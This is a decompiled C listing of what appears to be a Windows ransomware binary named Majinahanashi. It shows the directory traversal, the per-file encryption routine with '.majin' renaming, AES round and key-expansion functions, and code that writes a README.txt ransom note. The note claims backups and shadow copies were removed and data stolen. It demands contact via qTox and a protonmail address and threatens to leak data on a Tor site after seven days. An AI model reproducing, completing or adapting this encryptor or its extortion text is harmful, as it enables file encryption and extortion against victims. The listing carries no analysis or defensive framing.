  _WORD *v32; // rax
  __int64 v33; // rdx
  __int64 v34; // rcx
  _WORD *v35; // rsi
  __int64 v36; // rdx
  __int64 v37; // rcx
  __int64 v38; // rbp
  void (__fastcall *v39)(__int64, const char *, _QWORD, char *, _QWORD); // rbx
  unsigned int v40; // eax
  void (__fastcall *v41)(__int64, _QWORD, _WORD *); // rbx
  __int64 v42; // rax
  __int64 (__fastcall *v43)(__int64, _QWORD, __int64); // rbx
  __int64 v44; // rax
  _BYTE v45[4]; // [rsp+40h] [rbp-688h] BYREF
  _BYTE v46[12]; // [rsp+44h] [rbp-684h] BYREF
  _DWORD v47[11]; // [rsp+50h] [rbp-678h] BYREF
  __int16 v48; // [rsp+7Ch] [rbp-64Ch] BYREF
  __int16 v49; // [rsp+7Eh] [rbp-64Ah]
  __int16 v50; // [rsp+80h] [rbp-648h]
  _BYTE v51[1024]; // [rsp+2A0h] [rbp-428h] BYREF
  char v52; // [rsp+6E8h] [rbp+20h] BYREF

  result = sub_1400040C0(a2, (__int64)"*");
  v7 = result;
  if ( result != 0 )
  {
    v8 = sub_140003DE0(result);
    v9 = (__int64 (__fastcall *)(__int64, _QWORD, __int64))qword_140018770;
    v10 = v8;
    v13 = qword_140018740(v12, v11);
    result = v9(v13, 0, v7);
    if ( v10 != nullptr )
    {
      v14 = qword_1400186A8(v10, v47);
      v15 = (__int64 (__fastcall *)(__int64, _QWORD, _WORD *))qword_140018770;
      v16 = v14;
      v19 = qword_140018740(v18, v17);
      result = v15(v19, 0, v10);
      if ( v16 != -1 )
      {
        do
        {
          if ( (v48 != 46 || v49 != 0 && (v49 != 46 || v50 != 0)) && (v47[0] & 0x400) == 0 )
          {
            v20 = qword_140018878(65001, 0, &v48, 0xFFFFFFFFLL, 0, 0, 0, 0);
            if ( (unsigned int)(v20 - 1) <= 0x3FF )
            {
              qword_140018878(65001, 0, &v48, 0xFFFFFFFFLL, v51, v20, 0, 0);
              v21 = sub_1400040C0(a2, (__int64)v51);
              if ( v21 != 0 )
              {
                if ( (v47[0] & 0x10) != 0 )
                {
                  v22 = 0;
                  while ( (unsigned int)qword_1400187A8(v51, off_14000FE80[v22]) != 0 )
                  {
                    if ( (unsigned __int64)++v22 >= 27 )
                    {
                      if ( a1[3] != 0 )
                      {
                        if ( a1[2] != 0 )
                        {
                          v25 = qword_140018750(4294967285LL);
                          if ( (unsigned __int64)(v25 - 1) <= 0xFFFFFFFFFFFFFFFDuLL )
                            qword_140018880(v25, "  [shallow skip] ", 15, &v52, 0);
                          v26 = qword_1400187C8(v21);
                          v27 = qword_140018750(4294967285LL);
                          if ( (unsigned __int64)(v27 - 1) <= 0xFFFFFFFFFFFFFFFDuLL )
                            qword_140018880(v27, v21, v26, v45, 0);
                          v28 = qword_140018750(4294967285LL);
                          v24 = v28 - 1;
                          if ( (unsigned __int64)(v28 - 1) <= 0xFFFFFFFFFFFFFFFDuLL )
                            qword_140018880(v28, "\r\n", 2, v46, 0);
                        }
                      }
                      else if ( a3 < 32 )
                      {
                        sub_140006810(a1, v21, (unsigned int)(a3 + 1));
                      }
                      break;
                    }
                  }
                }
                else
                {
                  sub_140006C40(a1, v21, v51, v47[8] | ((unsigned __int64)v47[7] << 32));
                }
                v29 = (void (__fastcall *)(__int64, _QWORD, __int64))qword_140018770;
                v30 = qword_140018740(v24, v23);
                v29(v30, 0, v21);
              }
            }
          }
        }
        while ( (unsigned int)qword_1400186B0(v16, v47) != 0 );
        result = qword_1400186A0(v16);
        if ( *a1 == 0 && a1[1] == 0 )
        {
          result = (unsigned __int8)aMajinahanashiW[0];
          if ( aMajinahanashiW[0] != 0 && aMajinahanashiW[0] != 35 )
          {
            result = sub_1400040C0(a2, (__int64)"README.txt");
            v31 = result;
            if ( result != 0 )
            {
              v32 = sub_140003DE0(result);
              v35 = v32;
              if ( v32 != nullptr )
              {
                v38 = qword_140018650(v32, 0x40000000, 3, 0, 1, 128, 0);
                if ( v38 != -1 )
                {
                  v39 = (void (__fastcall *)(__int64, const char *, _QWORD, char *, _QWORD))qword_140018880;
                  v40 = qword_1400187C8(
                          "MAJINAHANASHI\r\n"
                          "\r\n"
                          "We entered. We looked around. We took what was there.\r\n"
                          "\r\n"
                          "This is the report.\r\n"
                          "\r\n"
                          "--------------------------------------------------------------------------\r\n"
                          "\r\n"
                          "WHAT WE DID\r\n"
                          "\r\n"
                          "Files were encrypted where they sat. A unique key per\r\n"
                          "file, wrapped under an offline key that leaves with us\r\n"
                          "when this is over. Backups and shadow copies were\r\n"
                          "removed because they get in the way.\r\n"
                          "\r\n"
                          "No files were deleted. No data was corrupted. Every\r\n"
                          "byte can be recovered.\r\n"
                          "\r\n"
                          "--------------------------------------------------------------------------\r\n"
                          "\r\n"
                          "WHAT WE TOOK\r\n"
                          "\r\n"
                          "A copy of your internal data was extracted during the\r\n"
                          "process. This is not a threat - it is a statement of\r\n"
                          "fact. We have it. You do not.\r\n"
                          "\r\n"
                          "If an agreement is reached, all copies are destroyed\r\n"
                          "and you receive written confirmation. If no agreement\r\n"
                          "is reached, the data finds new owners.\r\n"
                          "\r\n"
                          "--------------------------------------------------------------------------\r\n"
                          "\r\n"
                          "NEXT MOVE\r\n"
                          "\r\n"
                          "Contact us via qTOX: 59DE03AE55C400954D0973FFB90C251A7FDCEB3079A42DF6A6DB93E7D1915F5C47B238A2A"
                          "99E\r\n"
                          "Contact us via EMAIL: thedoctorcame@protonmail.com\r\n"
                          "Case:    873F5435\r\n"
                          "\r\n"
                          "Download qTOX: https://qtox.github.io/\r\n"
                          "\r\n"
                          "Send 2 files. We decrypt them. This is not a\r\n"
                          "negotiation tactic - it is verification that we\r\n"
                          "hold the keys and that recovery is possible.\r\n"
                          "Once you have proof, we talk.\r\n"
                          "\r\n"
                          "No intermediaries. No recovery consultants. No law\r\n"
                          "enforcement liaison. Every person you add to this\r\n"
                          "conversation is another person who knows what\r\n"
                          "happened here.\r\n"
                          "\r\n"
                          "--------------------------------------------------------------------------\r\n"
                          "\r\n"
                          "TIMELINE\r\n"
                          "\r\n"
                          "Day 7 - the full dataset is released. Regulators,\r\n"
                          "clients, and affected parties are notified directly.\r\n"
                          "\r\n"
                          "Disclosure site (Tor): http://lthicpjqc7gkn5eq3epxndc2uig3yngvcbdya4u3m3byjod5km4yuwqd.onion/\r"
                          "\n"
                          "\r\n"
                          "--------------------------------------------------------------------------\r\n"
                          "\r\n"
                          "This message is your copy. We do not send reminders.\r\n");
                  v39(
                    v38,
                    "MAJINAHANASHI\r\n"
                    "\r\n"
                    "We entered. We looked around. We took what was there.\r\n"
                    "\r\n"
                    "This is the report.\r\n"
                    "\r\n"
                    "--------------------------------------------------------------------------\r\n"
                    "\r\n"
                    "WHAT WE DID\r\n"
                    "\r\n"
                    "Files were encrypted where they sat. A unique key per\r\n"
                    "file, wrapped under an offline key that leaves with us\r\n"
                    "when this is over. Backups and shadow copies were\r\n"
                    "removed because they get in the way.\r\n"
                    "\r\n"
                    "No files were deleted. No data was corrupted. Every\r\n"
                    "byte can be recovered.\r\n"
                    "\r\n"
                    "--------------------------------------------------------------------------\r\n"
                    "\r\n"
                    "WHAT WE TOOK\r\n"
                    "\r\n"
                    "A copy of your internal data was extracted during the\r\n"
                    "process. This is not a threat - it is a statement of\r\n"
                    "fact. We have it. You do not.\r\n"
                    "\r\n"
                    "If an agreement is reached, all copies are destroyed\r\n"
                    "and you receive written confirmation. If no agreement\r\n"
                    "is reached, the data finds new owners.\r\n"
                    "\r\n"
                    "--------------------------------------------------------------------------\r\n"
                    "\r\n"
                    "NEXT MOVE\r\n"
                    "\r\n"
                    "Contact us via qTOX: 59DE03AE55C400954D0973FFB90C251A7FDCEB3079A42DF6A6DB93E7D1915F5C47B238A2A99E\r\n"
                    "Contact us via EMAIL: thedoctorcame@protonmail.com\r\n"
                    "Case:    873F5435\r\n"
                    "\r\n"
                    "Download qTOX: https://qtox.github.io/\r\n"
                    "\r\n"
                    "Send 2 files. We decrypt them. This is not a\r\n"
                    "negotiation tactic - it is verification that we\r\n"
                    "hold the keys and that recovery is possible.\r\n"
                    "Once you have proof, we talk.\r\n"
                    "\r\n"
                    "No intermediaries. No recovery consultants. No law\r\n"
                    "enforcement liaison. Every person you add to this\r\n"
                    "conversation is another person who knows what\r\n"
                    "happened here.\r\n"
                    "\r\n"
                    "--------------------------------------------------------------------------\r\n"
                    "\r\n"
                    "TIMELINE\r\n"
                    "\r\n"
                    "Day 7 - the full dataset is released. Regulators,\r\n"
                    "clients, and affected parties are notified directly.\r\n"
                    "\r\n"
                    "Disclosure site (Tor): http://lthicpjqc7gkn5eq3epxndc2uig3yngvcbdya4u3m3byjod5km4yuwqd.onion/\r\n"
                    "\r\n"
                    "--------------------------------------------------------------------------\r\n"
                    "\r\n"
                    "This message is your copy. We do not send reminders.\r\n",
                    v40,
                    &v52,
                    0);
                  qword_140018640(v38);
                }
                v41 = (void (__fastcall *)(__int64, _QWORD, _WORD *))qword_140018770;
                v42 = qword_140018740(v37, v36);
                v41(v42, 0, v35);
              }
              v43 = (__int64 (__fastcall *)(__int64, _QWORD, __int64))qword_140018770;
              v44 = qword_140018740(v34, v33);
              return v43(v44, 0, v31);
            }
          }
        }
      }
    }
  }
  return result;
}


// ----- sub_140006C40 @ 0x140006c40 -----
void __fastcall sub_140006C40(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  __int64 v8; // rdi
  char *v9; // rbp
  __int64 v10; // r14
  int v11; // eax
  __int64 v12; // rax
  __int64 v13; // rdi
  void (__fastcall *v14)(__int64, __int64, _QWORD, char *, _QWORD); // rbx
  unsigned int v15; // eax
  __int64 v16; // rcx
  int v17; // eax
  int v18; // edi
  __int64 v19; // rax
  __int64 v20; // rdi
  void (__fastcall *v21)(__int64, __int64, _QWORD, char *, _QWORD); // rbx
  unsigned int v22; // eax
  __int64 v23; // rsi
  __int64 v24; // r9
  unsigned int v25; // ebx
  _BYTE *v26; // r10
  int v27; // r8d
  __int64 v28; // r11
  __int64 i; // rdx
  char v30; // cl
  void (__fastcall *v31)(__int64, __int64, _QWORD, char *, _QWORD); // rbx
  unsigned int v32; // eax
  _BYTE v33[16]; // [rsp+30h] [rbp-38h] BYREF
  char v34; // [rsp+88h] [rbp+20h] BYREF

  if ( a4 != 0 )
  {
    if ( *(_DWORD *)a1 != 0 )
    {
      if ( !sub_140005F00(a3, (__int64)".majin") )
        return;
LABEL_11:
      if ( *(_DWORD *)(a1 + 4) != 0 )
      {
        ++*(_QWORD *)(a1 + 32);
        *(_QWORD *)(a1 + 48) += a4;
        sub_1400065A0((__int64)"  [dry] ");
        sub_1400065A0(a2);
        sub_1400065A0((__int64)"\r\n");
        if ( *(_DWORD *)(a1 + 8) != 0 )
        {
          v12 = qword_140018750(4294967285LL);
          v13 = v12;
          if ( (unsigned __int64)(v12 - 1) <= 0xFFFFFFFFFFFFFFFDuLL )
          {
            qword_140018880(v12, "  [dry] ", 8, &v34, 0);
            v14 = (void (__fastcall *)(__int64, __int64, _QWORD, char *, _QWORD))qword_140018880;
            v15 = qword_1400187C8(a2);
            v14(v13, a2, v15, &v34, 0);
            v16 = v13;
LABEL_31:
            qword_140018880(v16, "\r\n", 2, &v34, 0);
          }
        }
      }
      else
      {
        if ( *(_DWORD *)a1 != 0 )
          v17 = sub_140005050(a1, a2, a4);
        else
          v17 = sub_140005590(a1, a2, a4);
        v18 = v17;
        if ( v17 != 0 )
        {
          ++*(_QWORD *)(a1 + 40);
          v23 = qword_140018750(4294967284LL);
          if ( (unsigned __int64)(v23 - 1) > 0xFFFFFFFFFFFFFFFDuLL )
            return;
          if ( v18 < 0 )
            v33[0] = 45;
          v24 = (unsigned int)v18 >> 31;
          v25 = (unsigned int)v18 >> 31;
          v26 = &v33[v24];
          v27 = -v18;
          if ( v18 > 0 )
            v27 = v18;
          do
          {
            v28 = (int)v25++;
            *v26++ = v27 % 10 + 48;
            v27 /= 10;
          }
          while ( v27 != 0 );
          for ( i = v28; v24 < i; --i )
          {
            v30 = v33[v24];
            v33[v24++] = v33[i];
            v33[i] = v30;
          }
          v33[v25] = 0;
          qword_140018880(v23, "[!] err=", 7, &v34, 0);
          qword_140018880(v23, v33, v25, &v34, 0);
          qword_140018880(v23, " ", 1, &v34, 0);
          v31 = (void (__fastcall *)(__int64, __int64, _QWORD, char *, _QWORD))qword_140018880;
          v32 = qword_1400187C8(a2);
          v31(v23, a2, v32, &v34, 0);
          v16 = v23;
          goto LABEL_31;
        }
        ++*(_QWORD *)(a1 + 32);
        *(_QWORD *)(a1 + 48) += a4;
        if ( *(_DWORD *)(a1 + 8) != 0 )
        {
          v19 = qword_140018750(4294967285LL);
          v20 = v19;
          if ( (unsigned __int64)(v19 - 1) <= 0xFFFFFFFFFFFFFFFDuLL )
          {
            qword_140018880(v19, "  [+] ", 6, &v34, 0);
            v21 = (void (__fastcall *)(__int64, __int64, _QWORD, char *, _QWORD))qword_140018880;
            v22 = qword_1400187C8(a2);
            v21(v20, a2, v22, &v34, 0);
            v16 = v20;
            goto LABEL_31;
          }
        }
      }
    }
    else
    {
      v8 = 0;
      while ( 1 )
      {
        v9 = off_14000FF60[v8];
        v10 = (int)qword_1400187C8(a3);
        v11 = qword_1400187C8(v9);
        if ( v11 <= (int)v10 && (unsigned int)qword_1400187A8(a3 + v10 - v11, v9) == 0 )
          break;
        if ( (unsigned __int64)++v8 >= 20 )
        {
          if ( (unsigned int)qword_1400187A8(a3, "README.txt") == 0 || sub_140005F00(a3, (__int64)".majin") )
            return;
          goto LABEL_11;
        }
      }
    }
  }
}


// ----- sub_140007020 @ 0x140007020 -----
__int64 __fastcall sub_140007020(__int64 a1, __int64 a2, __int64 a3, int a4, int a5)
{
  *(_DWORD *)(a1 + 4) = a5;
  *(_QWORD *)(a1 + 8) = 0;
  *(_QWORD *)(a1 + 32) = 0;
  *(_QWORD *)(a1 + 40) = 0;
  *(_QWORD *)(a1 + 48) = 0;
  *(_DWORD *)a1 = a4;
  *(_QWORD *)(a1 + 16) = a2;
  *(_QWORD *)(a1 + 24) = a3;
  return 0;
}


// ----- sub_140007050 @ 0x140007050 -----
__int64 __fastcall sub_140007050(_DWORD *a1, _BYTE *a2)
{
  __int64 result; // rax
  _BYTE *i; // rbx
  int v5; // eax
  _BYTE v6[520]; // [rsp+20h] [rbp-208h] BYREF

  if ( a2 != nullptr && *a2 != 0 )
    return sub_140006810(a1, (__int64)a2, 0);
  result = (unsigned int)qword_140018718(512, v6) - 1;
  if ( (unsigned int)result <= 0x1FE )
  {
    for ( i = v6; *i != 0; i += (int)result + 1 )
    {
      if ( (unsigned int)qword_1400186D0(i) - 3 <= 1 )
      {
        v5 = qword_1400187C8(i);
        if ( v5 > 0 && i[v5 - 1] == 92 )
          i[v5 - 1] = 0;
        sub_140006810(a1, (__int64)i, 0);
      }
      result = qword_1400187C8(i);
    }
  }
  return result;
}


// ----- sub_140007120 @ 0x140007120 -----
__int64 __fastcall sub_140007120(__int64 a1, __int64 a2, __int64 a3)
{
  __m128i si128; // xmm2
  unsigned int *v5; // r9
  __int64 v6; // r11
  __int64 i; // r10
  unsigned int v8; // r8d
  int v11; // ecx
  unsigned int *v12; // rdx
  unsigned int v13; // eax
  char v14; // bl
  char v15; // r8
  char v16; // r14
  char v17; // r15
  char v18; // r11
  char v19; // r13
  char v20; // si
  char v21; // r10
  char v22; // cl
  char v23; // r12
  char v24; // di
  char v25; // r9
  char v26; // dl
  char v27; // cl
  char v28; // cl
  char v29; // r8
  char v30; // dl
  char v31; // al
  char v32; // cl
  char v33; // al
  char v34; // dl
  char v35; // al
  char v36; // cl
  char v37; // r8
  char v38; // cl
  char v39; // al
  char v40; // dl
  char v41; // al
  int v42; // r13d
  char v43; // al
  char v44; // cl
  char v45; // r8
  char v46; // al
  char v47; // cl
  unsigned int *v48; // r9
  __int64 v49; // r10
  __int64 v50; // rax
  unsigned int v51; // r8d
  int v54; // ecx
  unsigned int *v55; // rax
  unsigned int v56; // edx
  bool v57; // zf
  unsigned __int8 v58; // r15
  unsigned __int8 v59; // r14
  unsigned __int8 v60; // r12
  unsigned __int8 v61; // si
  __int64 v62; // rax
  unsigned __int8 v63; // di
  __int64 v64; // rax
  unsigned __int8 v65; // r10
  __int64 v66; // rax
  unsigned __int8 v67; // r11
  __int64 v68; // rax
  unsigned __int8 v69; // cl
  __int64 v70; // rax
  unsigned __int8 v71; // dl
  __int64 v72; // rax
  __int64 v73; // rcx
  unsigned int *v74; // r8
  __int64 j; // rax
  unsigned int v76; // r9d
  int v79; // ecx
  unsigned int *v80; // rdx
  unsigned int v81; // eax
  unsigned __int8 v83; // [rsp+20h] [rbp-30h] BYREF
  unsigned __int8 v84; // [rsp+21h] [rbp-2Fh]
  unsigned __int8 v85; // [rsp+22h] [rbp-2Eh]
  unsigned __int8 v86; // [rsp+23h] [rbp-2Dh]
  unsigned __int8 v87; // [rsp+24h] [rbp-2Ch]
  unsigned __int8 v88; // [rsp+25h] [rbp-2Bh]
  unsigned __int8 v89; // [rsp+26h] [rbp-2Ah]
  unsigned __int8 v90; // [rsp+27h] [rbp-29h]
  unsigned __int8 v91; // [rsp+28h] [rbp-28h]
  unsigned __int8 v92; // [rsp+29h] [rbp-27h]
  unsigned __int8 v93; // [rsp+2Ah] [rbp-26h]
  unsigned __int8 v94; // [rsp+2Bh] [rbp-25h]
  unsigned __int8 v95; // [rsp+2Ch] [rbp-24h]
  unsigned __int8 v96; // [rsp+2Dh] [rbp-23h]
  unsigned __int8 v97; // [rsp+2Eh] [rbp-22h]
  unsigned __int8 v98; // [rsp+2Fh] [rbp-21h]
  char v99; // [rsp+30h] [rbp-20h]
  char v100; // [rsp+31h] [rbp-1Fh]
  char v101; // [rsp+32h] [rbp-1Eh]
  char v102; // [rsp+33h] [rbp-1Dh]
  char v103; // [rsp+34h] [rbp-1Ch]
  __int64 v104; // [rsp+38h] [rbp-18h]
  __int64 v105; // [rsp+40h] [rbp-10h]
  __int64 v106; // [rsp+48h] [rbp-8h]
  __int64 v108; // [rsp+90h] [rbp+40h]
  char v110; // [rsp+A8h] [rbp+58h]

  sub_14000A820(&v83, a2, 16);
  si128 = _mm_load_si128((const __m128i *)&xmmword_140010310);
  v5 = (unsigned int *)&v83;
  v6 = a1 - (_QWORD)&v83;
  v106 = 4;
  for ( i = 4; i != 0; --i )
  {
    v8 = *(unsigned int *)((char *)v5 + v6);
    _XMM0 = _mm_shuffle_epi32(_mm_cvtsi32_si128(v8), 0);
    if ( dword_14001768C < 5 )
    {
      v11 = 0;
      v12 = v5;
      do
      {
        v12 = (unsigned int *)((char *)v12 + 1);
        v13 = v8 >> v11;
        v11 += 8;
        *((_BYTE *)v12 - 1) ^= v13;
      }
      while ( v11 < 32 );
    }
    else
    {
      __asm { vpsrlvd xmm1, xmm0, xmm3 }
      *v5 = _mm_cvtsi128_si32((__m128i)_mm_xor_ps(
                                         (__m128)_mm_shuffle_epi8(_XMM1, si128),
                                         (__m128)_mm_cvtsi32_si128(*v5)));
    }
    ++v5;
  }
  v105 = 13;
  v104 = v6 + 16;
  do
  {
    v14 = byte_1400101F0[v83];
    v15 = (v14 >> 7) & 0x1B;
    v101 = byte_1400101F0[v84];
    v99 = byte_1400101F0[v85];
    v16 = byte_1400101F0[v86];
    v17 = byte_1400101F0[v87];
    v18 = byte_1400101F0[v88];
    v103 = byte_1400101F0[v89];
    v19 = byte_1400101F0[v90];
    v110 = byte_1400101F0[v91];
    v20 = byte_1400101F0[v92];
    v21 = byte_1400101F0[v93];
    v102 = byte_1400101F0[v94];
    v100 = byte_1400101F0[v95];
    v22 = (v18 >> 7) & 0x1B;
    v23 = byte_1400101F0[v96];
    v24 = byte_1400101F0[v97];
    v25 = byte_1400101F0[v98];
    v26 = (v21 >> 7) & 0x1B;
    v83 = v18 ^ v15 ^ v22 ^ v21 ^ v25 ^ (2 * (v14 ^ v18));
    v84 = v14 ^ v22 ^ v26 ^ v21 ^ v25 ^ (2 * (v18 ^ v21));
    v27 = (v25 >> 7) & 0x1B;
    v85 = v14 ^ v18 ^ v26 ^ v27 ^ v25 ^ (2 * (v21 ^ v25));
    v86 = v14 ^ v18 ^ v15 ^ v27 ^ v21 ^ (2 * (v14 ^ v25));
    v28 = (v20 >> 7) & 0x1B;
    v29 = (v17 >> 7) & 0x1B;
    v30 = (v24 >> 7) & 0x1B;
    v87 = v16 ^ v20 ^ v29 ^ v28 ^ v24 ^ (2 * (v17 ^ v20));
    v31 = v28 ^ v30 ^ v24 ^ (2 * (v20 ^ v24));
    v32 = (v16 >> 7) & 0x1B;
    v88 = v16 ^ v17 ^ v31;
    v33 = v30 ^ v32 ^ (2 * (v16 ^ v24));
    v34 = (v99 >> 7) & 0x1B;
    v89 = v16 ^ v17 ^ v20 ^ v33;
    v35 = v32 ^ v24 ^ (2 * (v16 ^ v17));
    v36 = (v23 >> 7) & 0x1B;
    v90 = v17 ^ v20 ^ v29 ^ v35;
    v37 = (v110 >> 7) & 0x1B;
    v91 = v99 ^ v19 ^ v23 ^ v37 ^ v36 ^ (2 * (v110 ^ v23));
    v92 = v99 ^ v19 ^ v110 ^ v36 ^ v34 ^ (2 * (v99 ^ v23));
    v38 = (v19 >> 7) & 0x1B;
    v39 = v34 ^ v38 ^ (2 * (v99 ^ v19));
    v40 = (v103 >> 7) & 0x1B;
    v93 = v19 ^ v110 ^ v23 ^ v39;
    v41 = v19 ^ v110;
    v42 = dword_14001768C;
    v43 = v38 ^ (2 * v41);
    v44 = (v101 >> 7) & 0x1B;
    v94 = v99 ^ v110 ^ v23 ^ v37 ^ v43;
    v45 = (v100 >> 7) & 0x1B;
    v95 = v101 ^ v103 ^ v102 ^ v45 ^ v44 ^ (2 * (v101 ^ v100));
    v46 = v44 ^ v40 ^ (2 * (v101 ^ v103));
    v47 = (v102 >> 7) & 0x1B;
    v96 = v103 ^ v102 ^ v100 ^ v46;
    v97 = v101 ^ v102 ^ v100 ^ v40 ^ v47 ^ (2 * (v103 ^ v102));
    v48 = (unsigned int *)&v83;
    v49 = 4;
    v98 = v101 ^ v103 ^ v100 ^ v45 ^ v47 ^ (2 * (v102 ^ v100));
    v50 = v104;
    do
    {
      v51 = *(unsigned int *)((char *)v48 + v50);
      _XMM0 = _mm_shuffle_epi32(_mm_cvtsi32_si128(v51), 0);
      if ( v42 < 5 )
      {
        v54 = 0;
        v55 = v48;
        do
        {
          v55 = (unsigned int *)((char *)v55 + 1);
          v56 = v51 >> v54;
          v54 += 8;
          *((_BYTE *)v55 - 1) ^= v56;
        }
        while ( v54 < 32 );
        v50 = v104;
      }
      else
      {
        __asm { vpsrlvd xmm1, xmm0, xmm3 }
        *v48 = _mm_cvtsi128_si32((__m128i)_mm_xor_ps(
                                            (__m128)_mm_shuffle_epi8(_XMM1, si128),
                                            (__m128)_mm_cvtsi32_si128(*v48)));
      }
      ++v48;
      --v49;
    }
    while ( v49 != 0 );
    v57 = v105-- == 1;
    v104 = v50 + 16;
  }
  while ( !v57 );
  v83 = byte_1400101F0[v83];
  v58 = byte_1400101F0[v84];
  v59 = byte_1400101F0[v85];
  v60 = byte_1400101F0[v86];
  v87 = byte_1400101F0[v87];
  v84 = byte_1400101F0[v88];
  v61 = byte_1400101F0[v89];
  v62 = v90;
  v90 = v60;
  v63 = byte_1400101F0[v62];
  v91 = byte_1400101F0[v91];
  v64 = v93;
  v88 = byte_1400101F0[v92];
  v93 = v59;
  v65 = byte_1400101F0[v64];
  v66 = v94;
  v85 = v65;
  v94 = v63;
  v67 = byte_1400101F0[v66];
  v95 = byte_1400101F0[v95];
  v68 = v96;
  v96 = v58;
  v69 = byte_1400101F0[v68];
  v70 = v97;
  v92 = v69;
  v97 = v61;
  v71 = byte_1400101F0[v70];
  v72 = v98;
  v89 = v71;
  v98 = v67;
  v86 = byte_1400101F0[v72];
  v73 = a1 - (_QWORD)&v83 + 224;
  v74 = (unsigned int *)&v83;
  v108 = v73;
  for ( j = 4; j != 0; v106 = j )
  {
    v76 = *(unsigned int *)((char *)v74 + v73);
    _XMM0 = _mm_shuffle_epi32(_mm_cvtsi32_si128(v76), 0);
    if ( v42 < 5 )
    {
      v79 = 0;
      v80 = v74;
      do
      {
        v80 = (unsigned int *)((char *)v80 + 1);
        v81 = v76 >> v79;
        v79 += 8;
        *((_BYTE *)v80 - 1) ^= v81;
      }
      while ( v79 < 32 );
      j = v106;
      v73 = v108;
    }
    else
    {
      __asm { vpsrlvd xmm1, xmm0, xmm3 }
      *v74 = _mm_cvtsi128_si32((__m128i)_mm_xor_ps(
                                          (__m128)_mm_shuffle_epi8(_XMM1, si128),
                                          (__m128)_mm_cvtsi32_si128(*v74)));
    }
    ++v74;
    --j;
  }
  return sub_14000A820(a3, &v83, 16);
}


// ----- sub_140007710 @ 0x140007710 -----
void __fastcall sub_140007710(const __m128i *a1, __m128 *a2)
{
  __m128 v3; // xmm0
  __m128 v4; // xmm1
  __m128 v5; // xmm0
  __m128 v6; // xmm3
  __m128 v9; // xmm0
  __m128 v10; // xmm1
  __m128 v13; // xmm0
  __m128 v14; // xmm1
  __m128 v17; // xmm0
  __m128 v18; // xmm1
  __m128 v21; // xmm0
  __m128 v22; // xmm1
  __m128 v25; // xmm0
  __m128 v26; // xmm1
  __m128 v29; // xmm0
  __m128 v30; // xmm1
  __m128 v33; // xmm0
  __m128 v34; // xmm1
  __m128 v37; // xmm0
  __m128 v38; // xmm1
  __m128 v41; // xmm0
  __m128 v42; // xmm1
  __m128 v45; // xmm0
  __m128 v46; // xmm1
  __m128 v49; // xmm0
  __m128 v50; // xmm1
  __m128 v53; // xmm0
  __m128 v54; // xmm1

  _XMM2 = (__m128)_mm_loadu_si128(a1 + 1);
  v3 = (__m128)_mm_loadu_si128(a1);
  a2[1] = _XMM2;
  *a2 = v3;
  v4 = _mm_xor_ps((__m128)_mm_slli_si128((__m128i)v3, 4), v3);
  v5 = _mm_xor_ps((__m128)_mm_slli_si128((__m128i)v4, 4), v4);
  v6 = _mm_xor_ps((__m128)_mm_slli_si128((__m128i)v5, 4), v5);
  __asm { aeskeygenassist xmm0, xmm2, 1 }
  _XMM3 = _mm_xor_ps(v6, (__m128)_mm_shuffle_epi32(_XMM0, 255));
  v9 = _mm_xor_ps((__m128)_mm_slli_si128((__m128i)_XMM2, 4), _XMM2);
  a2[2] = _XMM3;
  v10 = _mm_xor_ps((__m128)_mm_slli_si128((__m128i)v9, 4), v9);
  __asm { aeskeygenassist xmm0, xmm3, 0 }
  _XMM2 = _mm_xor_ps(_mm_xor_ps((__m128)_mm_slli_si128((__m128i)v10, 4), v10), (__m128)_mm_shuffle_epi32(_XMM0, 170));
  v13 = _mm_xor_ps((__m128)_mm_slli_si128((__m128i)_XMM3, 4), _XMM3);
  a2[3] = _XMM2;
  v14 = _mm_xor_ps((__m128)_mm_slli_si128((__m128i)v13, 4), v13);
  __asm { aeskeygenassist xmm0, xmm2, 2 }
  _XMM3 = _mm_xor_ps(_mm_xor_ps((__m128)_mm_slli_si128((__m128i)v14, 4), v14), (__m128)_mm_shuffle_epi32(_XMM0, 255));
  v17 = _mm_xor_ps((__m128)_mm_slli_si128((__m128i)_XMM2, 4), _XMM2);
  a2[4] = _XMM3;
  v18 = _mm_xor_ps((__m128)_mm_slli_si128((__m128i)v17, 4), v17);
  __asm { aeskeygenassist xmm0, xmm3, 0 }
  _XMM2 = _mm_xor_ps(_mm_xor_ps((__m128)_mm_slli_si128((__m128i)v18, 4), v18), (__m128)_mm_shuffle_epi32(_XMM0, 170));
  v21 = _mm_xor_ps((__m128)_mm_slli_si128((__m128i)_XMM3, 4), _XMM3);
  a2[5] = _XMM2;
  v22 = _mm_xor_ps((__m128)_mm_slli_si128((__m128i)v21, 4), v21);
  __asm { aeskeygenassist xmm0, xmm2, 4 }
  _XMM3 = _mm_xor_ps(_mm_xor_ps((__m128)_mm_slli_si128((__m128i)v22, 4), v22), (__m128)_mm_shuffle_epi32(_XMM0, 255));
  v25 = _mm_xor_ps((__m128)_mm_slli_si128((__m128i)_XMM2, 4), _XMM2);
  a2[6] = _XMM3;
  v26 = _mm_xor_ps((__m128)_mm_slli_si128((__m128i)v25, 4), v25);
  __asm { aeskeygenassist xmm0, xmm3, 0 }
  _XMM2 = _mm_xor_ps(_mm_xor_ps((__m128)_mm_slli_si128((__m128i)v26, 4), v26), (__m128)_mm_shuffle_epi32(_XMM0, 170));
  a2[7] = _XMM2;
  v29 = _mm_xor_ps((__m128)_mm_slli_si128((__m128i)_XMM3, 4), _XMM3);
  v30 = _mm_xor_ps((__m128)_mm_slli_si128((__m128i)v29, 4), v29);
  __asm { aeskeygenassist xmm0, xmm2, 8 }
  _XMM3 = _mm_xor_ps(_mm_xor_ps((__m128)_mm_slli_si128((__m128i)v30, 4), v30), (__m128)_mm_shuffle_epi32(_XMM0, 255));
  v33 = _mm_xor_ps((__m128)_mm_slli_si128((__m128i)_XMM2, 4), _XMM2);
  a2[8] = _XMM3;
  v34 = _mm_xor_ps((__m128)_mm_slli_si128((__m128i)v33, 4), v33);
  __asm { aeskeygenassist xmm0, xmm3, 0 }
  _XMM2 = _mm_xor_ps(_mm_xor_ps((__m128)_mm_slli_si128((__m128i)v34, 4), v34), (__m128)_mm_shuffle_epi32(_XMM0, 170));
  v37 = _mm_xor_ps((__m128)_mm_slli_si128((__m128i)_XMM3, 4), _XMM3);
  a2[9] = _XMM2;
  v38 = _mm_xor_ps((__m128)_mm_slli_si128((__m128i)v37, 4), v37);
  __asm { aeskeygenassist xmm0, xmm2, 10h }
  _XMM3 = _mm_xor_ps(_mm_xor_ps((__m128)_mm_slli_si128((__m128i)v38, 4), v38), (__m128)_mm_shuffle_epi32(_XMM0, 255));
